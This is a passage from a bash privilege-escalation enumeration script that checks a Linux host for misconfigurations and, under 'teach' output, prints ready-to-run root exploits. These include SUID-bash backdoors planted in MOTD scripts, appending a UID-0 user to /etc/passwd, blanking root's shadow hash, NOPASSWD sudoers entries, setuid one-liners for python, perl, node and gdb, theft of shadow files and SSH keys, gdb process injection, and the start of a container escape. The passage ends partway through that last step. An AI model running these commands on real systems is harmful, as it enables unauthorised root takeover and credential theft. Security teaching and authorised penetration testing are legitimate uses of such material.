        teach "fi"
        teach "EOF"
        teach ""
        teach "TRIGGERING:"
        teach "  Every bash shell opened by any user"
        teach "  Very frequent - happens constantly"
        log ""
    fi
    
    # Report writable motd
    if [ -s "$temp_writable_motd" ]; then
        critical "WRITABLE /etc/update-motd.d - ROOT execution on ANY SSH connection"
        log ""
        
        while IFS='|' read -r item type; do
            if [ "$type" = "directory" ]; then
                critical "Writable directory: $item"
            else
                vuln "Writable MOTD script: $item"
            fi
        done < "$temp_writable_motd"
        
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  MOTD EXPLOITATION - INSTANT ROOT"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "CRITICAL FACT:"
        teach "  MOTD scripts run AS ROOT even when non-root users SSH!"
        teach ""
        teach "EXPLOITATION:"
        teach ""
        teach "  Method 1 - Create New Script:"
        teach "    cat > /etc/update-motd.d/00-exploit << 'EOF'"
        teach "#!/bin/sh"
        teach "chmod u+s /bin/bash"
        teach "EOF"
        teach "    chmod +x /etc/update-motd.d/00-exploit"
        teach ""
        teach "  Method 2 - Modify Existing:"
        teach "    cat >> /etc/update-motd.d/50-motd-news << 'EOF'"
        teach ""
        teach "if [ ! -f /tmp/.done ]; then"
        teach "    cp /bin/bash /tmp/.sh && chmod 4755 /tmp/.sh"
        teach "    touch /tmp/.done"
        teach "fi"
        teach "EOF"
        teach ""
        teach "TRIGGERING (INSTANT):"
        teach "  ssh user@localhost  # From target machine"
        teach "  ssh user@target     # From attack machine"
        teach "  # Exit SSH session"
        teach "  /bin/bash -p        # Root shell!"
        teach ""
        teach "WHY THIS IS POWERFUL:"
        teach "  • Runs AS ROOT automatically"
        teach "  • ANY SSH connection triggers it"
        teach "  • No reboot needed"
        teach "  • No waiting for admin"
        teach "  • Instant exploitation"
        log ""
    fi
    
    # === PHASE 4: CLEAN SUMMARY ===
    log ""
    if [ $found_issues -eq 0 ]; then
        ok "No writable boot/login scripts detected"
    else
        info "Boot/login script analysis complete"
        teach ""
        teach "EXPLOITATION PRIORITY:"
        teach "  1. /etc/update-motd.d → Instant (trigger with SSH)"
        teach "  2. /etc/profile.d → Fast (next user login)"
        teach "  3. /etc/bash.bashrc → Fast (next bash shell)"
        teach "  4. /etc/rc.local → Slow (next reboot)"
    fi
}
# === MAIL & LOGS ===
enum_mail_logs() {
    section "MAIL SPOOL & LOG ANALYSIS"
    
    explain_concept "Mail & Logs" \
        "Mail spools often contain credentials, password reset tokens, or sensitive information. Logs may reveal user behavior and secrets." \
        "Users receive system notifications via mail. Password resets, admin messages, application errors all go to mail. Logs capture authentication attempts, application errors with credentials." \
        "Check:\n  /var/mail/*\n  /var/spool/mail/*\n  ~/.mail\n  /var/log/auth.log (failed SSH attempts)\n  Application logs"
    
    # Check mail spools
    for maildir in /var/mail /var/spool/mail; do
        if [ -d "$maildir" ]; then
            find "$maildir" -type f -readable 2>/dev/null | while read mail; do
                vuln "Readable mail spool: $mail"
                teach "Read with: cat $mail | less"
                if grep -iE "password|token|reset" "$mail" 2>/dev/null | head -3 | grep -q "."; then
                    critical "Mail contains passwords/tokens: $mail"
                    warn "Mail contains password-related content!"
                fi
            done
        fi
    done
    
    # Check home directory mail
    find /home \( -path "*/containers/storage/*" \) -prune -o \( -name ".mail" -o -name "mail" -o -name "mbox" \) -print 2>/dev/null | while read mail; do
        [ -r "$mail" ] && info "Found mail file: $mail"
    done
    
    # Check auth logs for interesting info
    if [ -r /var/log/auth.log ]; then
        info "Checking auth.log for failed authentication attempts..."
        grep "Failed password" /var/log/auth.log 2>/dev/null | tail -5 | while read line; do
            log "  $line"
        done
        teach "Failed attempts reveal valid usernames"
    fi
}

# === BACKUP FILES ===
enum_backups() {
    section "BACKUP FILE DISCOVERY"
    
    explain_concept "Backup Files" \
        "Backup files often contain old configurations with credentials or reveal file structure." \
        "Admins create backups before changes. These backups may have weaker permissions or old credentials that still work. Common patterns: .bak, .old, .backup, ~, .swp, .save" \
        "Where to look:\n  /var/backups\n  /tmp/*.bak\n  /opt/*.old\n  Web roots with .bak files"
    
    info "Searching for backup files..."
    
    # System backups
    if [ -d /var/backups ]; then
        find /var/backups -type f -readable 2>/dev/null | head -10 | while read backup; do
            info "System backup: $backup"
            if echo "$backup" | grep -qE "passwd|shadow|group"; then
                critical "Authentication file backup: $backup"
                vuln "Authentication file backup found: $backup"
            fi
        done
    fi
    
    # Application backups
    for pattern in "*.bak" "*.backup" "*.old" "*~"; do
        find /var/www /opt /home -name "$pattern" -type f -readable 2>/dev/null | head -10 | while read backup; do
            warn "Backup file: $backup"
            
            # Check if it's a database dump
            if echo "$backup" | grep -qE "\.sql|dump"; then
                vuln "Database backup found: $backup"
                teach "May contain credentials in CREATE USER or INSERT statements"
            fi
        done
    done
    
    # Vim swap files (may contain unsaved work)
    find /root /home -name ".*.swp" -o -name ".*.swo" 2>/dev/null | while read swap; do
        [ -r "$swap" ] && warn "Vim swap file: $swap (may contain unsaved edits)"
    done
}

# === KERNEL MODULES ===
enum_kernel_modules() {
    section "LOADED KERNEL MODULES"
    
    explain_concept "Kernel Modules" \
        "Custom or vulnerable kernel modules can be exploited for privilege escalation." \
        "Modules extend kernel functionality. Custom modules may have vulnerabilities. Some modules (like vboxdrv) have known privilege escalation paths." \
        "Check lsmod output for unusual modules, then search for module_name + CVE"
    
    info "Loaded kernel modules:"
    lsmod | head -15
    
    # Check for interesting modules
    if lsmod | grep -qE "vboxdrv|vmware"; then
        warn "Virtualization modules detected"
        teach "Check for VM escape vulnerabilities"
    fi
    
    # Check for writable module directory
    if [ -w /lib/modules/$(uname -r) ]; then
        critical "Kernel module directory WRITABLE - Load malicious modules"
        vuln "Kernel module directory is WRITABLE!"
        teach "You can load malicious kernel modules"
        teach "  Create malicious .ko file and: insmod malicious.ko"
    fi
}

# === APPARMOR / SELINUX ===
enum_mac() {
    section "MANDATORY ACCESS CONTROL (MAC)"
    
    explain_concept "AppArmor & SELinux" \
        "MAC systems add another layer of access control beyond standard Unix permissions." \
        "Even if you have root, MAC can prevent certain actions. However, if MAC is disabled or in permissive mode, it's not protecting anything." \
        "Check status and consider if it's blocking your exploitation attempts"
        # Check AppArmor
    if command -v aa-status >/dev/null 2>&1; then
        local aa_status=$(aa-status 2>/dev/null | grep "apparmor module is loaded" )
        if [ -n "$aa_status" ]; then
            warn "AppArmor is active"
            teach "May restrict exploitation of certain binaries"
            teach "Check confined processes: aa-status"
        else
            ok "AppArmor is not active"
        fi
    fi
    
    # Check SELinux
    if command -v getenforce >/dev/null 2>&1; then
        local se_status=$(getenforce 2>/dev/null)
        case "$se_status" in
            Enforcing)
                warn "SELinux is in Enforcing mode"
                teach "Will block many exploitation attempts"
                ;;
            Permissive)
                info "SELinux is in Permissive mode (logs but doesn't block)"
                ;;
            Disabled)
                ok "SELinux is disabled"
                ;;
        esac
    fi
}

# === MOUNTED FILESYSTEMS ===
enum_mounts() {
    section "MOUNTED FILESYSTEMS"
    
    explain_concept "Mount Points" \
        "Unusual mounts may reveal NFS shares, sensitive directories, or container volumes." \
        "Network mounts (NFS, CIFS) may be writable from network. Bind mounts can expose sensitive directories. Docker volumes may contain application data." \
        "Look for: NFS mounts, /dev/sd* mounts in unusual places, tmpfs in weird locations"
    
    info "Current mounts:"
    mount | grep -vE "^(proc|sys|cgroup|devpts|tmpfs on /(dev|run|sys))" | while read line; do
        log "  $line"
        
        # Check for NFS
        if echo "$line" | grep -q "type nfs"; then
            warn "NFS mount detected: $line"
            teach "Check if writable and accessible from your attack machine"
        fi
        
        # Check for unusual tmpfs
        if echo "$line" | grep -q "tmpfs on /mnt\|tmpfs on /opt"; then
            warn "Unusual tmpfs mount: $line"
        fi
    done
    
    # Check /etc/fstab for auto-mounts
    if [ -r /etc/fstab ]; then
        info "Checking /etc/fstab for interesting mounts..."
        grep -vE "^#|^$" /etc/fstab | grep -E "nfs|cifs|smb" | while read line; do
            warn "Network filesystem in fstab: $line"
        done
    fi
}

# === SCHEDULED TASKS (AT/BATCH) ===
enum_scheduled() {
    section "SCHEDULED TASKS (AT/BATCH)"
    
    explain_concept "AT & BATCH Jobs" \
        "Besides cron, 'at' and 'batch' schedule one-time tasks. May be writable or reveal information." \
        "The 'at' command schedules one-time job execution. If job files are writable or contain sensitive commands, they can be exploited." \
        "Check: atq (list jobs), at -c <job_id> (view job contents)"
    
    if command -v atq >/dev/null 2>&1; then
        local at_jobs=$(atq 2>/dev/null | wc -l)
        if [ $at_jobs -gt 0 ]; then
            info "Found $at_jobs scheduled 'at' jobs"
            atq 2>/dev/null | while read line; do
                log "  $line"
            done
            teach "View job contents: at -c <job_number>"
        fi
    fi
    
    # Check at job directory
    if [ -d /var/spool/cron/atjobs ]; then
        find /var/spool/cron/atjobs -type f -readable 2>/dev/null | while read job; do
            warn "Readable at job: $job"
        done
    fi
}
# ============================================
# Process Monitoring for Cron
# ============================================

# ============================================
# Process Monitoring for Cron
# ============================================

enum_process_monitor() {
    section "PROCESS MONITORING (Hidden Cron Jobs)"
    
    explain_concept "Process Monitoring for Cron Detection" \
        "Many cron jobs run every 1-5 minutes but aren't listed in crontab files. Monitoring processes reveals these hidden scheduled tasks." \
        "Cron jobs may be in user crontabs, system cron directories, or systemd timers. Some run so frequently they're easier to detect by watching process creation than finding their config. Root cron jobs calling writable scripts = instant privilege escalation." \
        "This check monitors for 60 seconds. Look for:\n  • Processes appearing repeatedly (every minute)\n  • Root processes calling scripts in writable locations\n  • Backup scripts, monitoring tools, cleanup tasks"
    
    warn "Monitoring processes for 60 seconds to detect frequent cron jobs..."
    warn "Press ENTER to skip this check and continue to next enumeration."
    
    local proc_log="/tmp/.procs_$$"
    local skip_monitor=false
    
    # Monitor for 60 seconds or until Enter is pressed
    for i in {1..60}; do
        # Check if Enter was pressed (non-blocking)
        if read -t 0.01; then
            skip_monitor=true
            echo ""
            info "Skipping process monitoring..."
            break
        fi
        
        ps aux >> "$proc_log"
        sleep 1
        echo -ne "\rMonitoring: $i/60 seconds (press ENTER to skip)"
    done
    echo ""
    
    # Only analyze if we collected some data and didn't skip
    if [ -f "$proc_log" ] && ! $skip_monitor; then
        # Analyze for frequent processes
        info "Analyzing for frequently running processes..."
        sort "$proc_log" | uniq -c | sort -rn | head -20 | while read count cmd; do
            if [ $count -gt 5 ]; then
                warn "Process appeared $count times: $cmd"
                
                # Check if it's a script we can write to
                local script=$(echo "$cmd" | grep -oE '/[^ ]+\.sh|/[^ ]+\.py')
                if [ -n "$script" ] && [ -w "$script" ]; then
                    critical "Frequent cron script is WRITABLE: $script"
                    vuln "This script runs frequently and is writable!"
                fi
            fi
        done
    elif $skip_monitor && [ -f "$proc_log" ]; then
        info "Partial data collected before skip - analysis skipped"
    fi
    
    # Cleanup
    rm -f "$proc_log"
    
    # Clear any remaining input
    read -t 0.01 -n 10000 discard 2>/dev/null || true
}

# === WORLD-WRITABLE DIRECTORIES ===
enum_world_writable() {
    section "WORLD-WRITABLE DIRECTORIES"
    
    explain_concept "World-Writable Locations" \
        "Directories writable by everyone can be used for exploitation staging, privilege escalation via cron, or PATH hijacking." \
        "If a cron job or SUID binary accesses files in world-writable directories, you can replace those files with malicious versions." \
        "Common targets: /tmp, /var/tmp, /dev/shm"
    
    info "World-writable directories in sensitive locations:"
    find / -path /proc -prune -o -path /sys -prune -o -type d -perm -0002 -ls 2>/dev/null | head -20 | while read line; do
        local dir=$(echo "$line" | awk '{print $NF}')
        case "$dir" in
            /tmp|/var/tmp|/dev/shm)
                ok "Expected writable: $dir"
                ;;
            *)
                warn "Unusual world-writable: $dir"
                ;;
        esac
    done
}

# === CLIPBOARD & SCREEN CONTENT ===
enum_clipboard() {
    section "CLIPBOARD & SCREEN CONTENT"
    
    explain_concept "Clipboard & Screenshots" \
        "Clipboard may contain passwords. Screenshot tools or framebuffer access can capture what users are viewing." \
        "Users copy/paste passwords. GUI applications store clipboard in X11 selections. Framebuffer (/dev/fb0) contains current screen content." \
        "Check:\n  xclip -o (X11 clipboard)\n  cat /dev/fb0 > /tmp/screen.raw (framebuffer)\n  Requires video group or X11 access"
    
    # Check for X11 display
    if [ -n "$DISPLAY" ]; then
        info "X11 display detected: $DISPLAY"
        
        if command -v xclip >/dev/null 2>&1; then
            local clip=$(xclip -o 2>/dev/null)
            if [ -n "$clip" ]; then
                warn "Clipboard content available"
                teach "Read with: xclip -o"
            fi
        fi
        
        if command -v xdotool >/dev/null 2>&1; then
            info "xdotool available - can simulate keypresses and capture keystrokes"
        fi
    fi
    
    # Check framebuffer access
    if [ -r /dev/fb0 ]; then
        warn "Framebuffer is readable"
        info "Framebuffer access: /dev/fb0"
        teach "Can capture screenshots: cat /dev/fb0 > /tmp/screen.raw"
        teach "On single-user systems, this is expected behavior"
        teach "On multi-user systems, this could expose other users' sessions"
    fi
}

# === FILE PERMISSIONS ===
enum_writable_files() {
    section "WRITABLE SENSITIVE FILES"
    
    explain_concept "Critical File Permissions" \
        "Certain files control system authentication and authorization. If writable, you can modify system behavior to gain root." \
        "Linux relies on file permissions to separate privileged operations. Misconfigured permissions break this security model. This happens from bad scripts, sloppy admins, or intentional misconfigurations for debugging." \
        "Always check: /etc/passwd, /etc/shadow, /etc/sudoers, cron files, systemd services, and any root-owned scripts."
    
    # Check /etc/passwd
    if [ -w /etc/passwd ]; then
        critical "WRITABLE /etc/passwd - Add root user: echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd"
        vuln "/etc/passwd is WRITABLE!"
        explain_concept "Writable /etc/passwd" \
            "This file maps usernames to UIDs and stores login information. UID 0 = root. You can add a new root user or change existing UIDs." \
            "Originally /etc/passwd stored password hashes (hence the name). Modern systems use /etc/shadow for hashes, but /etc/passwd still controls UIDs, home directories, and login shells. Root-equivalent = UID 0." \
            "Exploitation:\n  1. Generate password hash: openssl passwd -1 -salt xyz password123\n  2. Add root user: echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd\n  3. Login: su hacker\n  4. Or modify existing user's UID to 0"
    else
        ok "/etc/passwd is not writable (as expected)"
    fi
    
    # Check /etc/shadow
    if [ -w /etc/shadow ]; then
        critical "WRITABLE /etc/shadow - Remove root password: sed -i 's/^root:[^:]*:/root::/' /etc/shadow"
        vuln "/etc/shadow is WRITABLE!"
        explain_concept "Writable /etc/shadow" \
            "This file stores password hashes. Write access means you control authentication." \
            "After /etc/passwd vulnerability became known, Linux moved password hashes to /etc/shadow (only readable by root). If writable, you bypass all password security." \
            "Exploitation:\n  1. Remove root's password: sed -i 's/^root:[^:]*:/root::/' /etc/shadow\n  2. Then: su root (no password needed)\n  3. Or replace with known hash"
    else
        ok "/etc/shadow is not writable (as expected)"
    fi
    
    # Check /etc/sudoers
    if [ -w /etc/sudoers ]; then
        critical "WRITABLE /etc/sudoers - Add yourself: echo '$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        vuln "/etc/sudoers is WRITABLE!"
        teach "This file controls sudo permissions. Direct root access:"
        teach "  echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        teach "  sudo /bin/bash"
    else
        ok "/etc/sudoers is not writable (as expected)"
    fi
    
    # Check sudoers.d directory
    if [ -w /etc/sudoers.d ]; then
        critical "WRITABLE /etc/sudoers.d/ - Create sudo rule file"
        vuln "/etc/sudoers.d/ directory is WRITABLE!"
        teach "Create a new sudoers file here:"
        teach "  echo '\$(whoami) ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn"
    fi
}

# === LINUX CAPABILITIES ===
enum_capabilities() {
    section "LINUX CAPABILITIES"
    
    if ! command -v getcap >/dev/null 2>&1; then
        warn "getcap not available (install libcap2-bin to check capabilities)"
        return
    fi
    
    # === PHASE 1: SILENT SCAN - Check what capabilities exist ===
    info "Scanning for binaries with capabilities..."
    
    local cap_output=$(getcap -r / 2>/dev/null)
    
    # Quick exit if nothing found at all
    if [ -z "$cap_output" ]; then
        ok "No capabilities found on this system"
        log ""
        teach "No binaries have elevated capabilities. This is normal - most systems"
        teach "use SUID instead. Capabilities must be explicitly set with setcap."
        return
    fi
    
    # === PHASE 2: ANALYZE FOR DANGEROUS CAPABILITIES ===
    # Whitelist of legitimate capability usage (reduces false positives)
    local legit_caps=(
        # Network tools that need raw socket access
        "/bin/ping:cap_net_raw"
        "/usr/bin/ping:cap_net_raw"
        "/bin/ping6:cap_net_raw"
        "/usr/bin/ping6:cap_net_raw"
        "/usr/bin/mtr-packet:cap_net_raw"
        "/usr/bin/traceroute6.iputils:cap_net_raw"
        
        # systemd components (normal for modern systems)
        "/usr/bin/systemd-detect-virt:cap_dac_override,cap_sys_ptrace"
        "/usr/lib/systemd/systemd-resolved:cap_net_bind_service"
        "/usr/lib/systemd/systemd-networkd:cap_net_admin,cap_net_bind_service,cap_net_raw"
        
        # GNOME/desktop components
        "/usr/bin/gnome-keyring-daemon:cap_ipc_lock"
    )
    
    # Check for dangerous capabilities
    local has_dangerous=0
    local dangerous_findings=""
    
    while IFS= read -r line; do
        local binary=$(echo "$line" | awk '{print $1}')
        local caps=$(echo "$line" | awk '{print $3}')
        
        # Check if this is a whitelisted combination
        local is_legit=0
        for legit in "${legit_caps[@]}"; do
            local legit_bin="${legit%%:*}"
            local legit_cap="${legit##*:}"
            
            if [ "$binary" = "$legit_bin" ]; then
                # Check if capabilities match (allowing for +ep suffix variations)
                if echo "$caps" | grep -qF "$legit_cap"; then
                    is_legit=1
                    break
                fi
            fi
        done
        
        # Skip if legitimate
        if [ $is_legit -eq 1 ]; then
            continue
        fi
        
        # Check for dangerous capabilities
        if echo "$caps" | grep -qE "cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_sys_module"; then
            has_dangerous=1
            dangerous_findings="${dangerous_findings}${line}\n"
        fi
    done <<< "$cap_output"
    
    # === PHASE 3: CONDITIONAL EDUCATION (only if dangerous caps found) ===
    if [ $has_dangerous -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  UNDERSTANDING CAPABILITIES - THE FUNDAMENTALS"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "THE PROBLEM:"
        teach "  Apache web server needs to bind to port 80 (requires root)"
        teach "  BUT Apache shouldn't be able to read /etc/shadow or SSH keys"
        teach "  "
        teach "  Old solution: Run entire Apache as root"
        teach "  Problem: If Apache is compromised, attacker has full root"
        teach "  "
        teach "  New solution: Give Apache ONLY cap_net_bind_service"
        teach "  Result: Can bind to port 80, but can't read sensitive files"
        teach ""
        teach "HOW CAPABILITIES WORK:"
        teach "  Root's powers are split into 38 specific capabilities."
        teach "  Each capability grants ONE specific privilege."
        teach "  Examples:"
        teach "    cap_net_bind_service → Bind to ports below 1024"
        teach "    cap_net_raw → Send raw network packets (ping)"
        teach "    cap_setuid → Change user ID (become another user)"
        teach "    cap_dac_override → Bypass file permission checks"
        teach ""
        teach "CAPABILITY vs SUID:"
        teach "  "
        teach "  SUID root binary: ALL of root's powers"
        teach "    • Can read any file"
        teach "    • Can kill any process"
        teach "    • Can load kernel modules"
        teach "    • Can do literally everything root can do"
        teach "  "
        teach "  Binary with cap_net_raw: ONLY raw socket access"
        teach "    • Can send raw packets"
        teach "    • Cannot read /etc/shadow"
        teach "    • Cannot kill processes"
        teach "    • Cannot modify system files"
        teach ""
        teach "WHY ADMINS MISCONFIGURE CAPABILITIES:"
        teach "  "
        teach "  Scenario: Admin needs Python script to switch between users"
        teach "  Admin thinks: 'I'll give Python cap_setuid for my script'"
        teach "  "
        teach "  What they don't realize:"
        teach "  • ANYONE can run /usr/bin/python3"
        teach "  • ANYONE can call os.setuid(0) in their own Python code"
        teach "  • It's like leaving a 'become root' button in /usr/bin"
        teach "  "
        teach "  The admin gave the BINARY the power, not just THEIR script."
        teach "  This is the critical misunderstanding that creates vulnerabilities."
        teach ""
        teach "WHY SHELLS DROP PRIVILEGES:"
        teach "  When SUID binary spawns bash/sh, shell checks if EUID ≠ RUID"
        teach "  If mismatched → drops EUID to match RUID (security feature)"
        teach "  Solution: Use -p flag to preserve privileges"
        teach "    bash -p → preserves elevated effective UID"
        log ""
    fi
    
    # === PHASE 4: REPORT FINDINGS with SPECIFIC EXPLOITATION ===
    if [ $has_dangerous -eq 0 ]; then
        ok "Only standard/safe capabilities found (network tools, systemd)"
        return
    fi
    
    # Process dangerous findings
    echo -e "$dangerous_findings" | while IFS= read -r line; do
        [ -z "$line" ] && continue
        
        local binary=$(echo "$line" | awk '{print $1}')
        local caps=$(echo "$line" | awk '{print $3}')
        local basename=$(basename "$binary")
        
        # === cap_setuid - Most Critical ===
        if echo "$caps" | grep -q "cap_setuid"; then
            critical "CAP_SETUID on $binary - Become root immediately"
            vuln "CAP_SETUID found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_SETUID - Change User ID Capability"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  Allows process to change its user ID to ANY user, including root."
            teach "  This is the power that 'su' and 'sudo' use to switch users."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Login programs need to switch from login screen to your user."
            teach "  SSH daemon becomes your user after authentication."
            teach "  su/sudo need to change to root or other users."
            teach ""
            teach "THE EXPLOITATION:"
            teach "  setuid() system call changes process's user ID."
            teach "  Normally only root can call setuid(0) to become root."
            teach "  With cap_setuid, ANY process can call setuid(0)!"
            teach ""
            teach "  Exploit chain:"
            teach "  1. Run binary with cap_setuid"
            teach "  2. Binary inherits the capability"
            teach "  3. Make it call setuid(0) - become root"
            teach "  4. Spawn shell - now you're root"
            teach ""
            
            # Provide binary-specific exploitation
            case $basename in
                python*|python)
                    teach "EXPLOITATION FOR PYTHON:"
                    teach "  $binary -c 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'"
                    teach ""
                    teach "  What this does:"
                    teach "  1. Import os module (operating system interface)"
                    teach "  2. os.setuid(0) - Change to UID 0 (root)"
                    teach "  3. os.system() - Execute /bin/bash as root"
                    teach "  4. -p flag preserves root privileges in shell"
                    ;;
                    
                perl)
                    teach "EXPLOITATION FOR PERL:"
                    teach "  $binary -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\", \"-p\";'"
                    teach ""
                    teach "  Breakdown:"
                    teach "  1. Load POSIX module (UNIX system calls)"
                    teach "  2. Call setuid(0) to become root"
                    teach "  3. exec() replaces process with bash"
                    ;;
                    
                ruby)
                    teach "EXPLOITATION FOR RUBY:"
                    teach "  $binary -e 'Process::Sys.setuid(0); exec \"/bin/bash\", \"-p\"'"
                    ;;
                    
                php)
                    teach "EXPLOITATION FOR PHP:"
                    teach "  $binary -r 'posix_setuid(0); system(\"/bin/bash -p\");'"
                    ;;
                    
                node|nodejs)
                    teach "EXPLOITATION FOR NODE.JS:"
                    teach "  $binary -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
                    ;;
                    
                gdb)
                    teach "EXPLOITATION FOR GDB:"
                    teach "  $binary -nx -ex 'python import os; os.setuid(0)' -ex 'shell /bin/bash -p' -ex quit"
                    ;;
                    
                *)
                    teach "GENERAL APPROACH:"
                    teach "  This binary can call setuid(0) to become root."
                    teach "  Find how $basename can execute system calls:"
                    teach ""
                    teach "  Method 1 - If it's a scripting language:"
                    teach "    Look for setuid() function in the language"
                    teach ""
                    teach "  Method 2 - Use GDB (works for any binary):"
                    teach "    gdb -q $binary"
                    teach "    (gdb) call (int)setuid(0)"
                    teach "    (gdb) shell /bin/bash -p"
                    teach ""
                    teach "  Method 3 - Check GTFOBins:"
                    teach "    https://gtfobins.github.io/#$basename"
                    ;;
            esac
            log ""
        fi
        
        # === cap_dac_read_search - Read Any File ===
        if echo "$caps" | grep -q "cap_dac_read_search"; then
            critical "CAP_DAC_READ_SEARCH on $binary - Read /etc/shadow and SSH keys"
            vuln "CAP_DAC_READ_SEARCH found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_DAC_READ_SEARCH - Bypass Read Permission Checks"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  DAC = Discretionary Access Control (normal file permissions)"
            teach "  This capability bypasses file READ permission checks."
            teach "  You can read ANY file on the system, regardless of permissions."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Backup programs need to read all files to create backups."
            teach "  Instead of running as full root, they get cap_dac_read_search."
            teach ""
            teach "WHAT YOU CAN READ:"
            teach "  • /etc/shadow (password hashes)"
            teach "  • /root/.ssh/id_rsa (root's SSH private key)"
            teach "  • /root/.bash_history (root's command history)"
            teach "  • Any user's private files"
            teach "  • Database files, configuration files with secrets"
            teach ""
            
            case $basename in
                tar)
                    teach "EXPLOITATION WITH TAR:"
                    teach "  $binary -czf /tmp/shadow.tar.gz /etc/shadow"
                    teach "  cd /tmp && tar -xzf shadow.tar.gz"
                    teach "  cat etc/shadow"
                    teach ""
                    teach "  Now crack hashes: john etc/shadow"
                    ;;
                    
                dd)
                    teach "EXPLOITATION WITH DD:"
                    teach "  $binary if=/etc/shadow of=/tmp/shadow"
                    teach "  cat /tmp/shadow"
                    ;;
                    
                rsync)
                    teach "EXPLOITATION WITH RSYNC:"
                    teach "  $binary /etc/shadow /tmp/shadow"
                    teach "  $binary /root/.ssh/id_rsa /tmp/root_key"
                    ;;
                    
                zip)
                    teach "EXPLOITATION WITH ZIP:"
                    teach "  $binary /tmp/secrets.zip /etc/shadow /root/.ssh/id_rsa"
                    teach "  unzip /tmp/secrets.zip"
                    ;;
                    
                *)
                    teach "EXPLOITATION STRATEGY:"
                    teach "  Use $basename to read and copy sensitive files:"
                    teach "  • /etc/shadow - crack passwords offline"
                    teach "  • /root/.ssh/id_rsa - use for SSH access as root"
                    teach "  • /root/.bash_history - find credentials in commands"
                    teach "  • Application configs - database passwords, API keys"
                    ;;
            esac
            log ""
        fi
        
        # === cap_dac_override - Write Any File ===
        if echo "$caps" | grep -q "cap_dac_override"; then
            critical "CAP_DAC_OVERRIDE on $binary - Write to /etc/passwd, /etc/shadow"
            vuln "CAP_DAC_OVERRIDE found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_DAC_OVERRIDE - Bypass ALL File Permission Checks"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  Like cap_dac_read_search, but for WRITE permissions too."
            teach "  You can READ and WRITE any file, regardless of permissions."
            teach "  This is almost as powerful as being root."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  System management tools need to modify protected files."
            teach "  Package managers, system updaters need this capability."
            teach ""
            teach "WHAT YOU CAN DO:"
            teach "  • Modify /etc/passwd (add root user)"
            teach "  • Modify /etc/shadow (remove root's password)"
            teach "  • Modify /etc/sudoers (give yourself sudo access)"
            teach "  • Inject SSH keys into /root/.ssh/authorized_keys"
            teach "  • Replace system binaries with backdoors"
            teach ""
            teach "EXPLOITATION STRATEGIES:"
            teach ""
            teach "  Option 1 - Add root user to /etc/passwd:"
            teach "    Generate hash: openssl passwd -1 -salt xyz password123"
            teach "    echo 'hacker:\$1\$xyz\$HASH:0:0::/root:/bin/bash' | $binary tee -a /etc/passwd"
            teach "    su hacker"
            teach ""
            teach "  Option 2 - Remove root password from /etc/shadow:"
            teach "    Use $basename to edit /etc/shadow"
            teach "    Change: root:\$6\$long_hash:... → root::..."
            teach "    su root (no password needed)"
            teach ""
            teach "  Option 3 - Inject SSH key:"
            teach "    echo 'YOUR_PUBLIC_KEY' | $binary tee -a /root/.ssh/authorized_keys"
            teach "    ssh -i your_private_key root@localhost"
            log ""
        fi
        
        # === cap_sys_ptrace - Debug Processes ===
        if echo "$caps" | grep -q "cap_sys_ptrace"; then
            warn "CAP_SYS_PTRACE found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_SYS_PTRACE - Debug and Inject Into Processes"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  ptrace() is the system call debuggers use to inspect/control"
            teach "  other processes. cap_sys_ptrace lets you debug ANY process,"
            teach "  including those owned by root."
            teach ""
            teach "EXPLOITATION:"
            teach "  1. Find root process: ps aux | grep root"
            teach "  2. Attach with gdb: gdb -p <PID>"
            teach "  3. Inject commands:"
            teach "     (gdb) call (int)system(\"chmod u+s /bin/bash\")"
            teach "  4. Detach: (gdb) detach"
            teach "  5. Execute SUID bash: /bin/bash -p"
            log ""
        fi
        
        # === cap_sys_admin - God Mode ===
        if echo "$caps" | grep -q "cap_sys_admin"; then
            critical "CAP_SYS_ADMIN on $binary - Nearly equivalent to root"
            vuln "CAP_SYS_ADMIN found: $binary"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  CAP_SYS_ADMIN - The 'God Mode' Capability"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT IT IS:"
            teach "  cap_sys_admin is a catch-all for 'system administration' tasks."
            teach "  It's extremely broad and provides many root-equivalent powers."
            teach "  Often called 'the new root' because it's so powerful."
            teach ""
            teach "WHY IT'S SO BROAD:"
            teach "  Created as a catch-all for operations that 'need admin privileges'"
            teach "  but don't fit other capabilities. Over time, dozens of operations"
            teach "  got added to it. Now it's almost as powerful as full root."
            teach ""
            teach "CONCRETE EXAMPLE - Container Escape:"
            teach ""
            teach "  Scenario: You're in a Docker container with cap_sys_admin"
            teach "  "
            teach "  1. List host's block devices:"
            teach "     fdisk -l"
            teach "     (Shows /dev/sda1, /dev/vda1, etc.)"
            teach "  "
            teach "  2. Create mount point:"
            teach "     mkdir /mnt/host"
